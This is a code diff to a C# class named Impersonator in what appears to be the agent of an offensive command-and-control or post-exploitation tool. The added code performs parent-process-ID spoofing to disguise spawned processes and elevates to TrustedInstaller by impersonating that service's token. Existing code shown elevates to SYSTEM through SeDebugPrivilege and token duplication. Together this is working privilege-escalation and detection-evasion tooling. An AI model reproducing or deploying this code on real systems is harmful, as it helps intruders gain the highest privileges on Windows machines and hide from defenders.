@@ -10,7 +10,54 @@ namespace Agent.Internal
 {
     public static class Impersonator
     {
+        public static IntPtr ParentProcessIDSpoof(int ppid)
+        {
+            IntPtr ipSize = IntPtr.Zero;
+            bool res = Native.Kernel32.InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref ipSize);
+            if (ipSize == IntPtr.Zero)
+                return IntPtr.Zero;
+            IntPtr lpAttributeList = Marshal.AllocHGlobal(ipSize);
+            if (lpAttributeList == IntPtr.Zero)
+                return IntPtr.Zero;
+            res = Native.Kernel32.InitializeProcThreadAttributeList(lpAttributeList, 1, 0, ref ipSize);
+            if (!res)
+                return IntPtr.Zero;
+            IntPtr parentHandle = Native.Kernel32.OpenProcess(0x001F0FFF, false, ppid);
+            if (parentHandle == IntPtr.Zero)
+                return IntPtr.Zero;
+            Console.WriteLine(":: Successfully spoofed ppid :::");
+            IntPtr lpValue = IntPtr.Zero;
+            lpValue = Marshal.AllocHGlobal(IntPtr.Size);
+            Marshal.WriteIntPtr(lpValue, parentHandle);
+            bool success = Native.Kernel32.UpdateProcThreadAttribute(lpAttributeList, 0, (IntPtr)0x00020000, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
+            if (!success)
+                return IntPtr.Zero;
+            return lpAttributeList;
+        }
 
+        public static bool ElevateToTrustedInstaller()
+        {
+            if (!Services.StartTrustedInstaller())
+                return false;
+            Process[] proccesses = Process.GetProcesses();
+            int tsPid = 0;
+            foreach (Process proc in proccesses)
+            {
+                if (proc.ProcessName == "TrustedInstaller")
+                {
+                    tsPid = proc.Id;
+                }
+            }
+            if (tsPid == 0)
+            {
+                return false;
+            }
+            if (!ImpersonateLoggedOnUserViaToken(tsPid))
+            {
+                return false;
+            }
+            return true;
+        }
         public static bool ElevateToSystem()
         {
             EnablePrivilege("SeDebugPrivilege");
@@ -55,7 +102,6 @@ namespace Agent.Internal
             }
             IntPtr DuplicatedToken = new IntPtr();
             if (!Native.Advapi.DuplicateToken(hToken, 2, ref DuplicatedToken)) return false;
-            // impersonate logged on user with duplicated token
             if (!Native.Advapi.ImpersonateLoggedOnUser(DuplicatedToken))
             {
                 return false;
